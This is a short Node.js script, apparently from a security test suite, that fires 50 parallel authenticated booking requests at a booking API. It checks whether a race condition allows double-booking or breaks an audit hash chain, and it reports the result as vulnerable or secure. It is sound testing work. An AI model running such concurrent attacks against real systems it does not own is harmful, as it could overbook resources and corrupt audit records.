// concurrency_overbooking.js
// Attack objective: Trigger race conditions to bypass validation (e.g., booking the same space twice, or breaking the Audit Hash Chain).

const fetch = require('node-fetch');

async function attack(apiUrl, token, spaceId, date) {
  console.log(`[Concurrency Attack] Sending 50 parallel requests to book space ${spaceId} on ${date}...`);
  
  const requests = [];
  for (let i = 0; i < 50; i++) {
    requests.push(
      fetch(`${apiUrl}/api/bookings`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ spaceId, date })
      })
    );
  }

  try {
    const responses = await Promise.all(requests);
    const successes = responses.filter(r => r.ok).length;
    
    console.log(`[Concurrency Attack] Successful bookings: ${successes}`);
    if (successes > 1) {
      console.log('❌ VULNERABILITY FOUND: Concurrency race condition allowed multiple bookings (Overbooking) or corrupted Hash Chain!');
      return true;
    } else {
      console.log('✅ SECURE: System handled concurrency properly (only 1 success or all failed).');
      return false;
    }
  } catch (err) {
    console.error('Error during attack:', err.message);
    return false;
  }
}

module.exports = { attack };
